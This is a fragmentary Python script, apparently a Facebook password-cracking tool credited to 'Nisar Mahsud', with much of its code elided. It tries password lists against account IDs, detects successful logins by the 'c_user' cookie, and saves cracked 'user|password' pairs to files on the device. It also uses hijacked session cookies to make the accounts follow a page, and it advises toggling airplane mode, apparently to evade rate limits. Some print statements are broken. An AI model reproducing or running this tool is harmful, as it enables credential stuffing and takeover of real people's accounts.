...
logo="""\033[1;37m
        ...
        d8b   db d888888b .d8888.  .d8b.  d8888b.                  888o  88   `88'   88'  YP d8' `8b 88  `8D
        88V8o 88    88    `8bo.   88ooo88 88oobY'                  88 V8o88    88      `Y8b. 88~~~88 88`8b
        88  V888   .88.   db   8D 88   88 88 `88.
        VP   V8P Y888888P `8888Y' YP   YP 88   YD

❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤❤

--------------------------------------------------
  Author   : Nisar Mahsud 
  Github   : https://github.com/NisarMahsud
  Youtube  : Nisar Ahmad
--------------------------------------------------
 Turn on  & off  flight (airoplane)  mode before use 
--------------------------------------------------"""
...
def hasil(OK,cp):
	...
	if len(cp) != 0:
	    ...
	    print('\n\n  \x1b[1;97m Total OK : \x1b[1;97m %s  \x1b[1;97m/sdcard/Nisar-OK.txt' % (H, P, str(len(ok))))

	    print('  \x1b[1;97m Total CP :\x1b[1;97m   %s \x1b[1;97m/sdcard/Nisar-CP.txt' % (H, P, str(len(cp))))

	    input("\x1b[1;97mPress enter to back Nisar Menu ")
...
def nisar():
			...
			print ("\033[1m [!] Tool    : NISAR MAHSUD")

			print (" [!] Brand   : NISAD MAHSUD")
...
class __xxx__:
    ...
    def __metode__(self, user, __chi__, cebok):
        ...
        sys.stdout.write(f"\r \x1b[1;33m[Nisar]\x1b[1;33m {loop}|{len(self.id)} \x1b[1;32m[ok][{len(ok)}] ")
        ...
        try:
            ...
            for pw in __chi__:
                ...
                if 'c_user' in session.cookies.get_dict():
                    ...
                    print(f"\r{H} [Nisar-Ok ] {user} | {pw}")

                    wrt = '%s|%s' % (user,pw)

                    ok.append(wrt)

                    open('/sdcard/Nisar_OK.txt' , 'a').write('%s\n' % wrt)
                    ...
                    try:
                        ...
                        open('/sdcard/Nisar_CP.txt' , 'a').write('%s\n' % wrt)
    ...
    def follow(self, session, coki):
        ...
        r = BeautifulSoup(session.get('https://free.facebook.com/AliBaloch356', cookies={'cookie': coki}).text, 'html.parser')
...
def dupcutter():
	...
	os.system("xdg-open https://wa.me/+03098924196")
